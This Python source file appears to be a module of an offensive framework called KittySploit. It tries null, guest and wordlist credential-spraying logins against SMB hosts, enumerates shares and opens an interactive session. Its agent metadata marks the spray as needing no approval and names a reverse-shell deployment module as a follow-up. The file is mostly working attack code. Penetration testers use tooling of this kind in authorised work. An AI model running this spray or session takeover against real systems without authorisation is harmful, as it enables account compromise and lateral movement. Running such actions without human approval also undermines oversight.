#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Probe SMB authentication profiles and open an interactive SMB session.

Workflow:
  1. Check null session / guest / supplied credentials / wordlists
  2. Enumerate shares on first successful login
  3. Optionally register an SMB session in the framework
"""

from __future__ import annotations

import itertools
import socket
from typing import Any, Dict, List, Optional, Tuple

from kittysploit import *
from core.framework.base_module import ModuleResult
from lib.protocols.smb.smb_client import SMBAuth, SMBClient
from lib.protocols.smb.smb_scanner_client import Smb_scanner_client


class Module(Auxiliary, Smb_scanner_client):
    DEFAULT_TIMEOUT = 10
    LISTENER_PATH = "listeners/smb/client"

    __info__ = {
        "name": "SMB session acquire",
        "description": (
            "Chains SMB recon (null session, guest, credentials or wordlists) and opens "
            "an authenticated SMB session when access is obtained."
        ),
        "author": "KittySploit Team",
        "tags": ["smb", "auxiliary", "session", "lateral", "windows", "credentials"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "credential_spray"],
            "expected_requests": 5,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints", "credentials"],
            "chain": {
                "consumes_capabilities": ["credentials"],
                "produces_capabilities": ["authenticated_session"],
                "suggested_followups": [
                    "post/smb/windows/deploy_reverse_shell",
                    "post/winrm/gather/enum_system",
                ],
            },
        },
    }

    username = OptString("", "Single SMB username to try", required=False)
    password = OptString("", "Password for the single username", required=False)
    domain = OptString("", "SMB domain or workgroup", required=False)
    try_null = OptBool(True, "Try anonymous null session", required=False)
    try_guest = OptBool(True, "Try guest account when no username is set", required=False)
    users_file = OptFile("", "File with usernames (one per line)", required=False)
    passes_file = OptFile("", "File with passwords (one per line)", required=False)
    create_session = OptBool(True, "Create an SMB session on successful authentication", required=False)
    smb_timeout = OptInteger(DEFAULT_TIMEOUT, "SMB connection timeout in seconds", required=False, advanced=True)
    stop_on_success = OptBool(True, "Stop after the first successful authentication profile", required=False)

    def _opt(self, name: str, default: Any = "") -> Any:
        value = getattr(self, name, default)
        if hasattr(value, "value"):
            return value.value
        return value

    def _timeout_seconds(self) -> int:
        return max(int(self._opt("smb_timeout", self.DEFAULT_TIMEOUT) or self.DEFAULT_TIMEOUT), 3)

    def _load_lines(self, path: str) -> List[str]:
        if not path:
            return []
        lines: List[str] = []
        with open(path, "r", encoding="utf-8", errors="replace") as handle:
            for line in handle:
                text = line.strip()
                if text and not text.startswith("#"):
                    lines.append(text)
        return lines

    def _auth_profiles(self) -> List[Tuple[str, SMBAuth]]:
        user = str(self._opt("username", "") or "").strip()
        password = str(self._opt("password", "") or "")
        domain = str(self._opt("domain", "") or "").strip()
        users_file = str(self._opt("users_file", "") or "").strip()
        passes_file = str(self._opt("passes_file", "") or "").strip()

        if user:
            return [(f"{domain}\\{user}" if domain else user, SMBAuth(username=user, password=password, domain=domain))]

        if users_file:
            users = self._load_lines(users_file)
            if not users:
                print_warning(f"No usernames loaded from {users_file}")
            passwords = self._load_lines(passes_file) if passes_file else [password or ""]
            if not passwords:
                passwords = [""]
            profiles: List[Tuple[str, SMBAuth]] = []
            for candidate_user, candidate_pass in itertools.product(users, passwords):
                label = f"{domain}\\{candidate_user}" if domain else candidate_user
                if candidate_pass:
                    label = f"{label}:{candidate_pass}"
                profiles.append((label, SMBAuth(username=candidate_user, password=candidate_pass, domain=domain)))
            return profiles

        profiles = []
        if bool(self._opt("try_null", True)):
            profiles.append(("null session", SMBAuth(username="", password="", domain="")))
        if bool(self._opt("try_guest", True)):
            profiles.append(("guest", SMBAuth(username="guest", password="", domain=domain)))
        return profiles

    def _connect(self, label: str, auth: SMBAuth) -> Optional[SMBClient]:
        host = self._host()
        if not host:
            return None
        client = SMBClient(
            host=host,
            port=self._port(),
            auth=auth,
            timeout=self._timeout_seconds(),
            use_ntlm_v2=True,
            direct_tcp=True,
        )
        if client.connect():
            print_success(f"SMB authenticated via {label}")
            return client
        client.close()
        return None

    def _share_names(self, client: SMBClient) -> List[str]:
        shares = client.list_shares()
        if shares:
            preview = ", ".join(shares[:8])
            suffix = "..." if len(shares) > 8 else ""
            print_info(f"Shares: {preview}{suffix}")
        return shares

    def _register_session(self, client: SMBClient, auth: SMBAuth, auth_label: str) -> Optional[str]:
        if not bool(self._opt("create_session", True)):
            return None
        if not self.framework or not hasattr(self.framework, "load_module"):
            print_warning("Framework unavailable — session not created")
            return None

        host = self._host()
        port = self._port()
        listener = self.framework.load_module(self.LISTENER_PATH)
        if not listener:
            print_error(f"Could not load {self.LISTENER_PATH}")
            return None

        listener.framework = self.framework
        shares = self._share_names(client)
        additional_data = {
            "host": host,
            "port": port,
            "username": auth.username,
            "password": auth.password,
            "domain": auth.domain,
            "auth_profile": auth_label,
            "shares": shares,
            "platform": "windows",
        }

        if not hasattr(listener, "_create_session_from_connection_data"):
            print_error("SMB listener does not support automatic session creation")
            return None

        session_id = listener._create_session_from_connection_data(client, host, port, additional_data)
        if session_id:
            print_success(f"SMB session created: {session_id}")
            print_info("Use `sessions -i <id>` to interact with the SMB shell")
        return session_id

    def check(self):
        host = self._host()
        if not host:
            return {"vulnerable": False, "reason": "target not set", "confidence": "low"}
        try:
            with socket.create_connection((host, self._port()), timeout=self._timeout_seconds()):
                pass
            return {
                "vulnerable": True,
                "reason": f"SMB port {self._port()} reachable on {host}",
                "confidence": "low",
            }
        except OSError as exc:
            return {"vulnerable": False, "reason": str(exc), "confidence": "high"}

    def run(self):
        host = self._host()
        if not host:
            print_warning("Target host is required")
            return False

        if self.null_session_accepted():
            print_info("Null session probe: accepted")
        else:
            print_info("Null session probe: rejected")

        profiles = self._auth_profiles()
        if not profiles:
            print_error("No authentication profiles configured")
            return False

        successes: List[Dict[str, Any]] = []
        stop_on_success = bool(self._opt("stop_on_success", True))

        for label, auth in profiles:
            print_status(f"Trying SMB auth profile: {label}")
            client = self._connect(label, auth)
            if not client:
                continue

            shares = self._share_names(client)
            session_id = self._register_session(client, auth, label)
            entry = {
                "profile": label,
                "username": auth.username,
                "domain": auth.domain,
                "shares": shares,
                "session_id": session_id,
            }
            successes.append(entry)

            if session_id:
                if stop_on_success:
                    return ModuleResult(success=True, session_id=session_id, data=entry)
            else:
                client.close()
                if stop_on_success:
                    return True

        if successes:
            last = successes[-1]
            return ModuleResult(success=True, session_id=last.get("session_id"), data=last)

        print_error("SMB authentication failed for all configured profiles")
        return False
